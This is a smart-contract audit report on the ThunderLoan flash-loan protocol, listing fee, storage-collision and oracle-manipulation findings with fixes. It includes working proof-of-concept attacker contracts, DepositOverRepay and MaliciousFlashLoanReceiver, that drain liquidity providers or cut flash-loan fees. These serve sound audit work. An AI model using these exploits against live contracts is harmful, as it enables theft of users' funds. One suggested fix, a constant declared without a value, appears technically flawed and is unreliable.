### [H-1] `ThunderLoan::deposit` function updates `exchangeRate` without getting any `fees`, causing unfair redeeming of the tokens by the liquidators.

**Description:** `ThunderLoan::s_exchangeRate` variable is responsible to share fairly the liquidity inside the `AssetToken` contract based on the fees gathered on every flashloan. The problem is that in the `deposit` function we are updating the `exchangeRate` without getting any fees. We are calculating the fee based on the deposited amount and then updating the `exchangeRate`.

<details>
<summary>`deposit` function</summary>

```javascript
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
        // @audit-high this two lines are screwing up the exchange rate, and liquidators can't redeem their
        // tokens. Because they are updating the exchange rate which causes that the token becomes more
        // valuable without putting any money, so is insuficeint balance
@>      uint256 calculatedFee = getCalculatedFee(token, amount);
@>      assetToken.updateExchangeRate(calculatedFee);
        
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

</details>

**Impact:** Couple of impacts:
- Unfair share to the liquidators, some are going to withdraw more liquidity than they deserved and others less.
- Violated `exhangeRate` variable.

**Proof of Concept:** You can paste this tests and modifiers to the `ThunderLoanTest.t.sol`.
Basic process of the protocol:
1. Allow token (tokenA);
2. Mint and deposits tokenA from `liquityProvider` to the `thunderLoan` contract.
3. Mint `tokenA` for the `user` to pay the `fee` to make a quick flashloan.
4. The `liquidityProvider` tries to `redeem` their money but `reverts` with insuficint balance.

<details>
<summary>Modifiers and Tests</summary>

Modifier allow token

```javascript
modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }
```

Modifier liquidityProvider deposits

```javascript
modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }
```

Test liquidity provider can't redeem

```javascript
function testCantRedeemForLiquidators() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();


        uint256 amountToRedeem = type(uint256).max;
        vm.expectRevert();
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();
    }
```

</details>

**Recommended Mitigation:** Consider deleting the lines on the function `deposit` that are updating the exchange rate:

```diff
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);
        
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```



### [H-2] Return the `ThunderLoan::flashloan` value in the `ThunderLoan::deposit` function can drain the liquidators balances.

**Description:** In `ThunderLoan::flashloan` function is checking the balance of the contract `AssetToken` to see if the value of the `flashloan` is returned, so at first, instead of using the `ThunderLoan::repay` function to return the money we can transfer directly to the contract and it will work (pass the function). Seeing this instead of transfering the money, we can use the `deposit` function to return the value of the flashloan, causing a couple of things:
- The `flashloaner` becoming a liquidator with the money of the iquidators.
- The respective shares will go to the `flashloaner` (attacker) and casuing a big mismatch on the balance of the contract and he can withdraw all that money, stealing from the real liquidators.

**Impact:** Stealing the funds of the liquidators, totally disrupt of the protocol.

**Proof of Concept:** We have a test and new contract from the `flashloaner` (attacker) tha receives teh flashloan, you can paste it in the `ThunderLoanTest.t.sol`:
1. Attacker makes a flashloan.
2. The value of tthe flashloan is sent to the contract and instead of repaying the money, it calls `deposit` and becomes a liquidator.
3. Redeem the funds just deposited to the contract.

<details>
<summary>Contract attacker</summary>

```javascript
contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    address s_token;
    
    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address /*initiator*/, bytes calldata /*params*/)
        external
        returns (bool) {
            s_token = token;
            assetToken = thunderLoan.getAssetFromToken(IERC20(token));
            IERC20(token).approve(address(thunderLoan), amount + fee);
            thunderLoan.deposit(IERC20(token), amount + fee);
            
            return true;
            
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(IERC20(s_token), amount);
    }
}
```

</details>


<details>
<summary>Test</summary>

```javascript
function testDepositInsteadOfRepay() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        console.log("Fee: ", fee);
        vm.stopPrank();

        // Is not going to be equal because we updated the exchange rate in the flashloan and deposit 
        // call function, so we going to get more than what we stole
        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);
        
    }
```
</details>

**Recommended Mitigation:** Instead of cheking all the balance of the contract, make sure everybody has to call the `repay` function to return the value of the flashloan.


### [H-3] Change of `storage` variable to `constant` on `ThunderLoanUpgraded.sol` cause storage collision on the upgradeability of the contract.

**Description:** On `ThunderLoan.sol` we have the following variables declared, both `storage`:
```javascript
    uint256 private s_feePrecision;
    uint256 private s_flashLoanFee;
```

But then on `ThunderLoanUpgraded.sol` (the upgrade of thunderloan based on the `readme.md`) change one variable to constant:
```javascript
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    uint256 public constant FEE_PRECISION = 1e18;
```

Causing a storage collision between them making the value of the fee wrong. As the constant variables are not stored on `storage` only on the contract itself.

**Impact:** Value of the fees are wrong, paying more the `flashloaners`.

**Proof of Concept:** Test:
1. Store the value of the real fee in a variable.
2. Upgrade the contract.
3. Store the value of the feem in a new variable.
4. Compare them.

<details>
<summary>Test storage collision</summary>

```javascript
function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        console.log("Fee before the uprade: ", feeBeforeUpgrade);
        console.log("Fee after the uprade: ", feeAfterUpgrade);
        assert(feeBeforeUpgrade < feeAfterUpgrade);
    }
```

</details>

**Recommended Mitigation:** Change as a `constant` the right variable in the `ThunderLoan.sol`.

```diff
-   uint256 private s_feePrecision;
+   uint256 private constant s_feePrecision; 
    uint256 private s_flashLoanFee; // 0.3% ETH fee
```

And change the order of declared variables on `ThunderLoanUpgraded.sol`
```diff
-   uint256 private s_flashLoanFee; // 0.3% ETH fee
-   uint256 public constant FEE_PRECISION = 1e18;
+   uint256 public constant FEE_PRECISION = 1e18;
+   uint256 private s_flashLoanFee; // 0.3% ETH fee
```


### [H-4] Wrong calculation of fees on `ThunderLoan::getCalculatedFee` function.

**Description:** On function `ThunderLoan::getCalculatedFee` calculates the fee based on the oracle of `T-Swap`, specifically on a pool `TokenPool::Weth` instead of grabing the `TokenPool` price  is taking the `weth` price, so is calculating the fee based on `weth` not on the `tokenPool`.
```javascript
function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
        //slither-disable-next-line divide-before-multiply
@>      uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
        //slither-disable-next-line divide-before-multiply
        fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
```

**Impact:** Wrong calculation of fees.

**Recommended Mitigation:** Taking the price of `TokenPool` of the pool oracle.



### [M-1] Taking Price Oracle from `TSwap` leads to origin a price oracle manipulation, setting the `fee` of the `flashLoaners` less than it should.

**Description:** In `ThunderLoan::getCalculatedFee` function takes as a price oracle the `TSwapPool` of the token used on th `flashloan`. Meaning that if we tank the price of the `TSwapPool` of the `tokenPool` / `WETH`, the fess could be lower than expected.

Function `getCalculatedFee`:

```javascript
function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
        //slither-disable-next-line divide-before-multiply
        // @audit-medium price oracle manipulation
        uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
        //slither-disable-next-line divide-before-multiply
        fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
    }
```

**Impact:** Flashloaners can pay less fees than expected for the liquidators

**Proof of Concept:** There is a test and new contract to receive the flashloan and do the price manipulation:
1. We set up a new environment with new contracts.
2. Fund the TSwap tokenA / WETH pool.
3. Fund the thunderloan to make the flashloans
4. Make the first flashloan.
4. Create a new contract which is going to take the flashloan and
    1. Swap the flashloan inside the TSwap pool tanking the price
    2. Make another flashloan before repaying the first flashloan
    3. Repay the first flashloan with normal fee
    4. Repay the second one with a fee less than expected


<details>
<summary>Contract `FlashLoanReceiver`</summary>

Paste this at the end of the `ThunderLoanTest.t.sol`
```javascript
// We have to make a separate contract to receive the flashloan and do the stuff manipulate the price oracle
// and get less fees from thunderloan
contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    BuffMockTSwap tswapPool;
    address repayAddress;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;
    
    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address /*initiator*/, bytes calldata /*params*/)
        external
        returns (bool) {

            if (!attacked) {
                // Receive the flashloan and tank the price of TSwap with the flashloan
                // 2. Take out another flashLoan to see the difference
                feeOne = fee;
                attacked = true;
                uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
                IERC20(token).approve(address(tswapPool), 50e18);

                // We tank the price
                tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);

                // We call second flashloan
                thunderLoan.flashloan(address(this), IERC20(token), amount, "");

                // repay
                // This mode doesn't work because we can't repay if we do two flashLoans on the same Token (Low bug)
                //IERC20(token).approve(address(thunderLoan), amount + fee);
                //thunderLoan.repay(IERC20(token), amount + fee);
                IERC20(token).transfer(repayAddress, amount + fee);
            } else {
                // Calculate the fee and repay
                feeTwo = fee;
                //IERC20(token).approve(address(thunderLoan), amount + fee);
                //thunderLoan.repay(IERC20(token), amount + fee);
                IERC20(token).transfer(repayAddress, amount + fee);
            }
            return true;
            
    }
}

```


</details>


<details>
<summary>Test Manipulate price oracle</summary>

```javascript
function testOracleManipulation() public {
        // 1. Set up contracts
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        // Create pool WETH / TOKENA
        address pool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // 2. Fund TSWAP
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(pool, 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(pool, 100e18);
        // Ratio 100 WETH = 100 tokenA
        // Price 1:1
        BuffMockTSwap(pool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();
        
        // 3. Fund ThunderLoan
        //  Set and allow token
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        //  Fund
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();
        // We have right now 100 WETH / 100 tokenA on TSwap
        // 1000 tokenA in thunderLoan
        // Take out a flashloan of 50 tokenA
        // swap it on the DEX tanking the price > 150 tokenA -> ~80 WETH
        // Take out another flashloan of 50 tokenA (and we will see how much cheaper it is!).

        // 4. We are going to take out two flashloans
        //  a. One to nuke the price of the WETH / tokenA TSwap
        //  b. To show that doing so greatly reduces the fees we pay on thunderloan

        uint256 normalFeeCost100 = thunderLoan.getCalculatedFee(tokenA, 100e18);
        uint256 normalFeeCost50 = thunderLoan.getCalculatedFee(tokenA, 50e18);
        console.log("Normal Fee for 100e18 is: ", normalFeeCost100);
        console.log("Normal Fee for 50e18 is: ", normalFeeCost50);
        // 296147410319118389

        uint256 amountToBorrow = 50e18; // gonna do this twice
        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(pool, address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)));
        
        vm.startPrank(user);
        // MInt some tokens to the contract receiver to pay the fee
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo();
        console.log("Attack total fee is: ", attackFee);
        console.log("Attack fee one is: ", flr.feeOne());
        console.log("Attack fee two is: ", flr.feeTwo());
        assert(attackFee < normalFeeCost100);
    
    }
```

</details>

**Recommended Mitigation:** Use another oracle for the price like `Chainlink`.